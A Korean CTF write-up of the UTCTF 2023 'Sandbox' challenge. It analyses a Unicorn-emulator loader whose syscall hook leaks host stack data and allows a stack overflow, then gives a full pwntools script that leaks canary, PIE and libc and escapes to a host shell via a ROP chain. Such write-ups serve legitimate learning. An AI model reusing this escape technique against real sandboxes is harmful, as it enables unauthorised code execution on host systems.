---
layout: post
title: "[UTCTF 2023] Sandbox write-up"
date: 2023-03-30 18:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, Unicorn, BOF]
img_path: 2023-03-30_sandbox
---

## [0x00] 요약

---

유니콘 에뮬레이터에 등록된 custom syscall handler의 취약점을 이용하여, guest machine에서 host machine으로 sandbox escape를 수행하는 문제

## [0x01] 접근 방법

---

두 개의 실행 가능한 바이너리 `hello`와 `loader`가 주어집니다. 해당 바이너리에 대한 보호 기법은 다음과 같습니다.

![checksec](1.png)

`loader`는 unicorn engine을 통해서, `hello` 바이너리를 유니콘 가상 머신 위에 업로드하고, 이를 실행합니다. 즉, 문제 이름에도 나왔듯이 Sandbox Escape가 이 문제의 핵심입니다.

`loader`의 일부 소스 코드를 가져왔습니다.

```c
int main(int argc, const char **argv, const char **envp) {
	// include/unicorn/unicorn.h
	// arch는 UC_ARCH_X86(x86_64도 포함하는 내용)
	// mode는 UC_MODE_64로 설정하여 uc파라미터에 인스턴스를 생성한다
	uc_open(4, 8, &uc);
	loader(argv[1], uc, &begin, v19, v18);

	value = 0x7FFC00;
	// include/unicorn/x86.h
	// UC_X86_REG_RSP를 0x7FFC00로 한다.
	uc_reg_write(uc, 44, &value);
	
	// unicorn 스택 내에 argv와 argc를 구성한다.
	
	// RSP와 RBP를 같은 값으로 만든다.
	uc_reg_read(uc, 44LL, &value);
	uc_reg_write(uc, 36LL, &value);

	// include/unicorn/unicorn.h
	// UC_HOOK_MEM_READ_UNMAPPED(16) | UC_HOOK_MEM_WRITE_UNMAPPED(32) 이벤트에 대한 후킹 함수 등록
	uc_hook_add(uc, (unsigned int)&v13, 48, (unsigned int)hook_mem_invalid, 0, 1, 0LL);
	
	// UC_HOOK_INSN(2), UC_X86_INS_SYSCALL(699)로 syscall에 대한 후킹 함수 등록
  uc_hook_add(uc, (unsigned int)&v14, 2, (unsigned int)hook_syscall, 0, 1, 0LL, 699);
  uc_emu_start(uc, begin, -1LL, 0LL, 0LL);
  uc_close(uc);
}
```

간단하게 설명하자면, 인자로 받은 `hello` 바이너리를 유니콘 가상 머신 위에 로드하고, 스택의 시작은 `0x7FFC00`으로 하며, `syscall`에 대한 후킹 함수로 `hook_syscall` 함수가 등록됩니다. 그런 뒤에 `uc_emu_start`로 가상 머신을 구동합니다.

`hello` 바이너리는 다음과 같은 소스 코드를 지니고 있으며, Canary 보호 기법도 걸려 있지 않은 상태이기 때문에, Stack BOF를 통해서 원하는 함수를 호출할 수 있습니다. 또한, 바이너리 주소는 그대로 uc 메모리에 할당되는 것을 확인하였습니다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v8[256]; // [rsp+10h] [rbp-100h] BYREF
  puts("Welcome to the UTCTF secure sandbox environment. Please enter your name: ", argv);
  gets(v8);
  printf((unsigned int)"hello, %s\n", (unsigned int)v8, v3, v4, v5, v6, (char)argv);
  return 0;
}
```

이런 문제에서 가장 중요한 것은 등록된 핸들러에서 취약점을 찾는 것입니다. 문제 전반에 대해 이해를 하였으니, 등록된 핸들러에서 취약점을 찾아 익스플로잇을 해 봅시다.

## [0x02] 분석

---

먼저, `hello` 바이너리는 정적 링킹되어 있기 때문에 원하는 가젯을 모두 사용할 수 있습니다. 그리고 이를 통해, rdi, rsi, rdx, rax 레지스터를 통제할 수 있습니다.

```
brwook@ubuntu:~/ctf/01_utctf/pwn_sandbox$ file hello 
hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

또한, 가장 중요한 `syscall`도 쉽게 `ret`가 뒤에 있는 가젯을 가져올 수 있었습니다.

![gadget](2.png)

```c
unsigned __int64 __fastcall hook_syscall(__int64 uc, __int64 addr)
{
  ...
  v31 = __readfsqword(0x28u);

  ++syscall_cnt;
  memset(s, 0, 0x80uLL);
  uc_reg_read(uc, 35LL, &uc_rax);
  uc_reg_read(uc, 39LL, &uc_rdi);
  uc_reg_read(uc, 43LL, &uc_rsi);
  uc_reg_read(uc, 40LL, &uc_rdx);
  if ( uc_rax == 1024 )
  {
    v29 = uc_rdi - 0x7F0000;
    *(_DWORD *)((char *)&stack + uc_rdi - 0x7F0000) = syscall_cnt;
  }
  else if ( uc_rax )
  {
    switch ( uc_rax )
    {
      case 1LL:                                 // write
        uc_mem_read(uc_, uc_rsi, s, uc_rdx);    // BOF
        printf("\x1B[33m>>> syscall write\x1B[0m(fd=%d, *buf='%s', count=%d)\n", uc_rdi, s, uc_rdx);
        uc_reg_write(uc_, 35LL, &uc_rdx);
        break;
      case 20LL:                                // writev : default action
        ...
        break;
      case 158LL:                               // arch_prctl
      case 218LL:                               // set_tid_address
      case 16LL:                                // ioctl : do nothing
        ...
        break;
      default:
        v13 = 0;
        for ( j = 0; (unsigned __int64)j <= 1; ++j )
        {
          if ( exit_syscalls[j] == uc_rax )     // exit, exit_group
            syscall(uc_rax, uc_rdi, uc_rsi, uc_rdx);
        }
        printf(">>> enumation stoped because of invalid syscall %d\n", uc_rax);
        uc_emu_stop(uc_);
        break;
    }
  }
  else                                          // read
  {
    v27 = uc_rdx - 1;
    v9 = uc_rdx;
    v10 = 0LL;
    uc_rdx_ = uc_rdx;
    v8 = 0LL;
    v2 = 16 * ((uc_rdx + 15) / 0x10);
    while ( &uc_rdx_ != (size_t *)((char *)&uc_rdx_ - (v2 & 0xFFFFFFFFFFFFF000LL)) )
      ;
    v3 = alloca(v2 & 0xFFF);
    if ( (v2 & 0xFFF) != 0 )
      *(size_t *)((char *)&uc_rdx_ + (v2 & 0xFFF) - 8) = *(size_t *)((char *)&uc_rdx_ + (v2 & 0xFFF) - 8);
    buf = &uc_rdx_;
    v20 = read(uc_rdi, &uc_rdx_, uc_rdx);
    uc_reg_write(uc_, 35LL, &v20);
    uc_mem_write(uc_, uc_rsi, buf, uc_rdx);
  }
  return __readfsqword(0x28u) ^ v31;
}
```

유니콘 가상 머신 내에 있는 guest machine에서 syscall을 실행할 경우, 위 핸들러가 실행됩니다. 위 소스 코드에서 두 개의 취약점을 가지고 익스플로잇을 수행할 수 있었는데요, 이는 다음과 같습니다:

- write : s가 0x80 크기인데, 원하는 크기만큼 복사할 수 있으므로 Stack BOF 취약점 발생
    - 그러나, `loader` 바이너리는 canary가 걸려 있기 때문에 canary 값을 알아야 이용 가능합니다.
- read : host machine의 스택에서 원하는 값을 guest machine으로 복사
    - 이때, BOF가 발생하지 않도록 스택의 길이를 늘려주는데, 스택을 0으로 초기화하지 않기 때문에 스택에 남아 있는 값(stack, pie, libc, canary, etc.)을 guest machine으로 복사할 수 있습니다.

이 두 개의 취약점을 이용하면, host machine에서 ROP를 수행할 수 있게 됩니다.

## [0x03] 익스플로잇

---

```python
from pwn import *

def uc_syscall(rax, rdi, rsi, rdx):
    pl = b''
    pl += p64(pop_rax) + p64(rax)
    pl += p64(pop_rdi) + p64(rdi)
    pl += p64(pop_rsi_r15) + p64(rsi) + p64(0)
    pl += p64(pop_rdx) + p64(rdx)
    pl += p64(syscall)
    return pl

context.terminal = ["tmux", "splitw", "-h"]
context.arch='amd64'
p = process(['./loader', 'hello'], aslr=1)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', False)
pop_rdi = 0x40013af
pop_rdx = 0x40023b3
pop_rsi_r15 = 0x40013ad
pop_rax = 0x401001
syscall = 0x4002e6d
main = 0x4000129
WRITE = 1
READ = 0

payload = b''
payload += b'A' * 0x108
# stack leak
payload += uc_syscall(READ, 0, 0x4000000, 0x80)
payload += uc_syscall(WRITE, 1, 0x4000000, 0x80)

# PIE leak
payload += uc_syscall(READ, 0, 0x4000000, 0x80)
payload += uc_syscall(WRITE, 1, 0x4000000, 0x80)

# canary leak
payload += uc_syscall(READ, 0, 0x4000000, 0x40 + 0x100)
payload += uc_syscall(WRITE, 1, 0x4000000, 0x20)

# libc leak
payload += uc_syscall(READ, 0, 0x4000000, 0x80 + 0x748)
payload += uc_syscall(WRITE, 1, 0x4000000, 0x20)
payload += p64(main)
p.sendlineafter(b"\n", payload)

sleep(0.1)
p.send(b'B'*8)
p.recvuntil(b"B"*8)
stack = u64(p.recv(6) +b'\x00\x00')
log.success(f"stack @ {hex(stack)}")

sleep(0.1)
p.send(b'A'*0x38)
p.recvuntil(b"A"*0x38)
PIE_base = u64(p.recv(6) +b'\x00\x00') - 0x35d71b 
log.success(f"PIE base @ {hex(PIE_base)}")

sleep(0.1)
p.send(b'A' * 0x19)
p.recvuntil(b"A"*0x19)
canary = u64(b'\x00' + p.recv(7))
log.success(f"canary @ {hex(canary)}")

sleep(0.1)
p.send(b'A' * 0x10)
p.recvuntil(b"A"*0x10)
libc.address = u64(p.recv(6) + b'\x00\x00') - libc.symbols['_IO_2_1_stdout_'] 
log.success(f"libc base @ {hex(libc.address)}")

payload = b''
payload += b'A' * 0x108

# Exploit
payload += uc_syscall(READ, 0, 0x4000000, 0x300) 
payload += uc_syscall(WRITE, 1, 0x4000000, 0x300)
p.sendlineafter(b"\n", payload)

rop = ROP([libc])
rop.call(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = b'A'*0x88
payload += p64(canary)
payload += b'A'*0x38
payload += rop.chain()
p.send(payload)

p.interactive()
```

![shell](3.png)

문제만 다운 받고 나중에 풀어서 플래그는 모르겠네요!

## [0x04] 참고 자료

---

- 출제자 write-up: [https://github.com/utisss/UTCTF-23/tree/main/puffer/pwn-sandbox](https://github.com/utisss/UTCTF-23/tree/main/puffer/pwn-sandbox)
    - 인텐 풀이는 `1024`번째 custom syscall을 활용하여, `exit_syscalls`에 59(execve)를 덮어쓰는 거였습니다. `read`를 수행할 때 size만큼 계속 입력받게 하든가, size만큼 버퍼를 초기화했으면 제 풀이는 불가능했을 것 같습니다.
- nobodyisnobody님의 write-up: [https://github.com/nobodyisnobody/write-ups/tree/main/UTCTF.2023/pwn/UTCTF.Sandbox/](https://github.com/nobodyisnobody/write-ups/tree/main/UTCTF.2023/pwn/UTCTF.Sandbox/)
    - Canary랑 libc를 다 구했는데, 출제자 라업에 맞게 `1024`번째 syscall을 활용하여 풀이하였습니다.